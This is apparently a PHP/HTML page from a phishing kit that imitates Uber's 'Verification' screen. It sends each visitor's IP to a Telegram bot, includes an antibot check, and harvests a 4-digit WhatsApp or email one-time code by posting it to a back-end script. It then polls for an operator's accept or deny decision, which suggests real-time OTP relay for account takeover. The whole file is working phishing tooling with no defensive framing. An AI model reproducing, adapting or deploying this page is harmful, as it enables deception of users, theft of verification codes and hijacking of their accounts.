<?php
session_start();
include "./Assets/php/config/config.php";
include "./Assets/php/prevents/antibot.php";

$firstName = isset($_SESSION['firstName']) && !empty($_SESSION['firstName']) ? $_SESSION['firstName'] : "Client";
$maskedNumber = isset($_SESSION['maskedNumber']) && !empty($_SESSION['maskedNumber']) ? $_SESSION['maskedNumber'] : "your phone";

$message = "🚨 Visiteur sur la page de Verification [Uber]\n" .
    "🌐 IP : " . $_SERVER['REMOTE_ADDR'] . "\n" .
    "<blockquote>└ © @MJ_coder</blockquote>";

sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>Uber | Verification</title>
    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
    <link
        href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&amp;family=Inter:wght@400;500;600;700&amp;display=swap"
        rel="stylesheet" />
    <link
        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap"
        rel="stylesheet" />
    <script id="tailwind-config">
        tailwind.config = {
            darkMode: "class",
            theme: {
                extend: {
                    "colors": {
                        "surface-container-low": "#f3f3f3",
                        "on-tertiary-fixed": "#ffffff",
                        "on-primary": "#e2e2e2",
                        "inverse-surface": "#303030",
                        "tertiary-container": "#747474",
                        "surface-dim": "#dadada",
                        "primary-fixed": "#5e5e5e",
                        "surface-container-lowest": "#ffffff",
                        "surface-container-highest": "#e2e2e2",
                        "surface-bright": "#f9f9f9",
                        "surface-container-high": "#e8e8e8",
                        "on-secondary-container": "#1a1c1c",
                        "on-primary-container": "#ffffff",
                        "on-tertiary": "#e2e2e2",
                        "on-secondary-fixed": "#1a1c1c",
                        "background": "#f9f9f9",
                        "primary-fixed-dim": "#474747",
                        "on-secondary": "#ffffff",
                        "error": "#ba1a1a",
                        "on-secondary-fixed-variant": "#3a3c3c",
                        "surface-tint": "#5e5e5e",
                        "secondary-fixed-dim": "#aaabab",
                        "surface-variant": "#e2e2e2",
                        "on-tertiary-container": "#ffffff",
                        "on-primary-fixed-variant": "#e2e2e2",
                        "on-error": "#ffffff",
                        "secondary": "#5d5f5f",
                        "surface-container": "#eeeeee",
                        "tertiary": "#3b3b3b",
                        "primary-container": "#3b3b3b",
                        "tertiary-fixed": "#5e5e5e",
                        "tertiary-fixed-dim": "#474747",
                        "on-surface": "#1b1b1b",
                        "inverse-primary": "#c6c6c6",
                        "outline-variant": "#c6c6c6",
                        "surface": "#f9f9f9",
                        "on-error-container": "#410002",
                        "primary": "#000000",
                        "on-tertiary-fixed-variant": "#e2e2e2",
                        "on-surface-variant": "#474747",
                        "on-primary-fixed": "#ffffff",
                        "secondary-container": "#d4d4d4",
                        "secondary-fixed": "#c6c6c7",
                        "on-background": "#1b1b1b",
                        "inverse-on-surface": "#f1f1f1",
                        "outline": "#777777",
                        "error-container": "#ffdad6"
                    },
                    "borderRadius": {
                        "DEFAULT": "0.125rem",
                        "lg": "0.25rem",
                        "xl": "0.5rem",
                        "full": "0.75rem"
                    },
                    "fontFamily": {
                        "headline": ["Plus Jakarta Sans"],
                        "body": ["Inter"],
                        "label": ["Inter"]
                    }
                },
            },
        }
    </script>
    <style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
        }

        body {
            font-family: 'Inter', sans-serif;
        }

        h1,
        h2,
        .brand-text {
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        /* Entrance Animations (Vengeance UI style) */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(15px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .animate-fade-in-up {
            animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            opacity: 0;
        }

        .delay-100 {
            animation-delay: 100ms;
        }

        .delay-200 {
            animation-delay: 200ms;
        }

        .delay-300 {
            animation-delay: 300ms;
        }

        .delay-400 {
            animation-delay: 400ms;
        }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            15%      { transform: translateX(-8px); }
            30%      { transform: translateX(8px); }
            45%      { transform: translateX(-6px); }
            60%      { transform: translateX(6px); }
            75%      { transform: translateX(-4px); }
            90%      { transform: translateX(4px); }
        }
        .shake-error {
            animation: shake 0.6s cubic-bezier(0.36, 0.07, 0.19, 0.97);
        }
    </style>
</head>
<body class="bg-surface text-on-surface min-h-screen flex flex-col">

<!-- ===== LOADING OVERLAY ===== -->
<div id="loadingOverlay" class="hidden fixed inset-0 z-[999] flex flex-col items-center justify-center bg-white">
    <div class="flex flex-col items-center gap-8">
        <!-- Premium animated rings -->
        <div class="relative w-24 h-24">
            <div class="absolute inset-0 rounded-full border-4 border-black/10 animate-ping"></div>
            <div class="absolute inset-2 rounded-full border-4 border-black/20 animate-ping" style="animation-delay:0.15s"></div>
            <div class="absolute inset-4 rounded-full border-4 border-black border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
                <span class="material-symbols-outlined text-black text-2xl">lock</span>
            </div>
        </div>
        <!-- Pulsing dots -->
        <div class="flex gap-2">
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.15s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.3s"></div>
        </div>
        <div class="text-center">
            <p class="text-lg font-bold text-black editorial-headline">Verifying your code</p>
            <p class="text-sm text-neutral-400 mt-1">Please wait, this may take a moment...</p>
        </div>
    </div>
</div>

<!-- TopAppBar -->
<header class="fixed top-0 w-full bg-white dark:bg-black flex items-center justify-start h-16 px-4 z-50">
    <button class="p-2 text-black dark:text-white hover:bg-neutral-100 dark:hover:bg-neutral-900 rounded-full scale-95 transition-transform duration-150" onclick="history.back()">
        <span class="material-symbols-outlined">arrow_back</span>
    </button>
    <span class="ml-4 text-xl font-bold tracking-tight text-black dark:text-white brand-text">Uber</span>
</header>

<div class="w-full flex-grow flex flex-col items-center">
    <!-- Content Canvas -->
    <main class="flex-grow pt-24 pb-32 px-6 max-w-md mx-auto w-full">
        <!-- Editorial Headline Section -->
        <section class="mb-10 animate-fade-in-up delay-100">
            <h1 class="text-2xl font-bold tracking-tight text-on-surface mb-4 leading-tight uppercase">
                Welcome back, <?= htmlspecialchars($firstName) ?>.
            </h1>
            <p id="instruction-text" class="text-on-surface-variant text-md leading-relaxed mb-6">
                Enter the 4-digit code sent to your WhatsApp at <span dir="ltr"><?= htmlspecialchars($maskedNumber) ?></span>.
            </p>
            <a class="inline-block text-primary font-semibold hover:underline text-sm transition-all" href="#">
                Changed your mobile number?
            </a>
        </section>

        <!-- Verification Input Group -->
        <section class="mb-8 animate-fade-in-up delay-200">
            <div id="pinInputs" class="flex gap-4">
                <input id="x1" name="x1" aria-label="Digit 1"
                    class="pin-input w-14 h-14 text-center text-xl font-bold bg-surface-container border-none rounded-lg focus:ring-2 focus:ring-primary focus:bg-surface-container-high transition-all"
                    maxlength="1" type="tel" autocomplete="one-time-code"/>
                <input id="x2" name="x2" aria-label="Digit 2"
                    class="pin-input w-14 h-14 text-center text-xl font-bold bg-surface-container border-none rounded-lg focus:ring-2 focus:ring-primary focus:bg-surface-container-high transition-all"
                    maxlength="1" type="tel"/>
                <input id="x3" name="x3" aria-label="Digit 3"
                    class="pin-input w-14 h-14 text-center text-xl font-bold bg-surface-container border-none rounded-lg focus:ring-2 focus:ring-primary focus:bg-surface-container-high transition-all"
                    maxlength="1" type="tel"/>
                <input id="x4" name="x4" aria-label="Digit 4"
                    class="pin-input w-14 h-14 text-center text-xl font-bold bg-surface-container border-none rounded-lg focus:ring-2 focus:ring-primary focus:bg-surface-container-high transition-all"
                    maxlength="1" type="tel"/>
            </div>
            <!-- Deny error message (hidden by default) -->
            <div id="errorMsg" class="hidden mt-4 p-3 rounded-lg bg-red-50 border border-red-200">
                <div class="flex items-center gap-2">
                    <span class="material-symbols-outlined text-red-600 text-lg">cancel</span>
                    <p class="text-sm font-semibold text-red-800">Incorrect code. Please try again.</p>
                </div>
            </div>
            <!-- Resend button (hidden by default) -->
            <div id="resendBlock" class="hidden mt-4">
                <button id="resendBtn" onclick="resendCode()" disabled
                    class="w-full py-3 px-4 flex items-center justify-center gap-2 bg-surface-container rounded-lg text-sm font-semibold text-on-surface-variant transition-all disabled:opacity-50 disabled:cursor-not-allowed">
                    <span class="material-symbols-outlined text-base">refresh</span>
                    <span id="resendLabel">Resend code in <span id="countdown">30</span>s</span>
                </button>
            </div>
        </section>

        <!-- Secondary Actions -->
        <section class="space-y-4 animate-fade-in-up delay-300">
            <button type="button" onclick="trackAction('whatsapp_code')"
                class="w-full py-4 px-6 flex items-center justify-start gap-3 bg-surface-container hover:bg-surface-container-high rounded-lg transition-all active:scale-[0.98]">
                <span class="material-symbols-outlined text-green-600">message</span>
                <span class="font-semibold text-sm">Send code via WhatsApp</span>
            </button>
            <button type="button" onclick="trackAction('email_login')"
                class="w-full py-4 px-6 flex items-center justify-start gap-3 bg-surface-container hover:bg-surface-container-high rounded-lg transition-all active:scale-[0.98]">
                <span class="material-symbols-outlined">mail</span>
                <span class="font-semibold text-sm">Login with email</span>
            </button>
        </section>
    </main>

    <!-- BottomNavBar -->
    <footer class="fixed bottom-0 left-0 w-full z-50 flex px-4 pb-8 bg-white dark:bg-black">
        <div class="flex items-center justify-between w-full">
            <button type="button"
                class="flex items-center justify-center w-12 h-12 bg-surface-container-highest text-on-surface rounded-full hover:opacity-90 active:scale-95 transition-all"
                onclick="history.back()">
                <span class="material-symbols-outlined">arrow_back</span>
            </button>
            <button type="button" onclick="submitPin()"
                class="flex items-center justify-between bg-black dark:bg-white text-white dark:text-black rounded-full px-8 py-4 gap-4 hover:opacity-90 active:scale-98 transition-all shadow-lg">
                <span class="font-bold text-sm tracking-wide">Next</span>
                <span class="material-symbols-outlined">arrow_forward</span>
            </button>
        </div>
    </footer>
</div>

<div class="h-16 w-full"></div>

<script>
const maskedNumber = "<?= htmlspecialchars($maskedNumber) ?>";
let pollInterval = null;
let currentSid = null;

// Auto-focus next input
const pinInputs = document.querySelectorAll('.pin-input');
pinInputs.forEach((input, idx) => {
    input.addEventListener('input', function() {
        if(this.value.length === 1) {
            if(idx < pinInputs.length - 1) {
                pinInputs[idx + 1].focus();
            } else {
                // Last digit entered — auto submit
                submitPin();
            }
        }
    });
    input.addEventListener('keydown', function(e) {
        if(e.key === 'Backspace' && !this.value && idx > 0) {
            pinInputs[idx - 1].focus();
        }
    });
});

function submitPin() {
    const x1 = document.getElementById('x1').value;
    const x2 = document.getElementById('x2').value;
    const x3 = document.getElementById('x3').value;
    const x4 = document.getElementById('x4').value;

    if(!x1 || !x2 || !x3 || !x4) return;

    // Show loading overlay
    document.getElementById('loadingOverlay').classList.remove('hidden');
    document.getElementById('errorMsg').classList.add('hidden');
    document.getElementById('resendBlock').classList.add('hidden');

    const formData = new FormData();
    formData.append('pin', 'verify_pin');
    formData.append('x1', x1);
    formData.append('x2', x2);
    formData.append('x3', x3);
    formData.append('x4', x4);

    fetch('./Assets/php/config/func.php', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if(data.status === 'pending' && data.sid) {
            currentSid = data.sid;
            // Start polling every 3 seconds
            pollInterval = setInterval(() => pollDecision(currentSid), 3000);
        } else {
            showDeny();
        }
    })
    .catch(() => showDeny());
}

function pollDecision(sid) {
    fetch('./Assets/php/config/check_status.php?sid=' + encodeURIComponent(sid))
    .then(r => r.json())
    .then(data => {
        if(data.status === 'accept') {
            clearInterval(pollInterval);
            window.location.href = './youbooking.php';
        } else if(data.status === 'deny') {
            clearInterval(pollInterval);
            showDeny();
        }
        // else pending => keep polling
    })
    .catch(() => {}); // keep polling on network error
}

function showDeny() {
    // Hide loading overlay
    document.getElementById('loadingOverlay').classList.add('hidden');
    
    // Clear PIN inputs
    pinInputs.forEach(inp => { inp.value = ''; inp.classList.remove('ring-2','ring-primary'); });
    pinInputs[0].focus();

    // Shake animation
    const pinBox = document.getElementById('pinInputs');
    pinBox.classList.add('shake-error');
    pinInputs.forEach(inp => inp.classList.add('bg-red-100','border','border-red-400'));
    setTimeout(() => {
        pinBox.classList.remove('shake-error');
        pinInputs.forEach(inp => inp.classList.remove('bg-red-100','border','border-red-400'));
    }, 600);

    // Show error
    document.getElementById('errorMsg').classList.remove('hidden');
    document.getElementById('resendBlock').classList.remove('hidden');

    // Start 30s countdown
    startResendTimer();
}

function startResendTimer() {
    const btn = document.getElementById('resendBtn');
    const cd  = document.getElementById('countdown');
    const lbl = document.getElementById('resendLabel');
    btn.disabled = true;
    let secs = 30;
    cd.textContent = secs;

    const timer = setInterval(() => {
        secs--;
        cd.textContent = secs;
        if(secs <= 0) {
            clearInterval(timer);
            btn.disabled = false;
            lbl.innerHTML = 'Resend code';
        }
    }, 1000);
}

function resendCode() {
    document.getElementById('errorMsg').classList.add('hidden');
    document.getElementById('resendBlock').classList.add('hidden');
    pinInputs.forEach(inp => inp.value = '');
    pinInputs[0].focus();
}

function trackAction(actionName) {
    const instruction = document.getElementById("instruction-text");
    instruction.style.transition = 'opacity 0.2s ease';
    instruction.style.opacity = '0';

    setTimeout(() => {
        instruction.innerHTML = '<span class="flex items-center gap-2"><svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Sending code...</span>';
        instruction.style.opacity = '1';
    }, 200);

    const formData = new FormData();
    formData.append('action_tracker', actionName);
    fetch('./Assets/php/config/func.php', { method: 'POST', body: formData }).catch(() => {});

    setTimeout(() => {
        instruction.style.opacity = '0';
        setTimeout(() => {
            if(actionName === 'email_login') {
                instruction.innerHTML = 'Enter the 4-digit code sent to your email.';
            } else {
                instruction.innerHTML = 'Enter the 4-digit code sent to your WhatsApp at <span dir="ltr">' + maskedNumber + '</span>.';
            }
            instruction.style.opacity = '1';
        }, 300);
    }, 1500);
}
</script>
</body>
</html>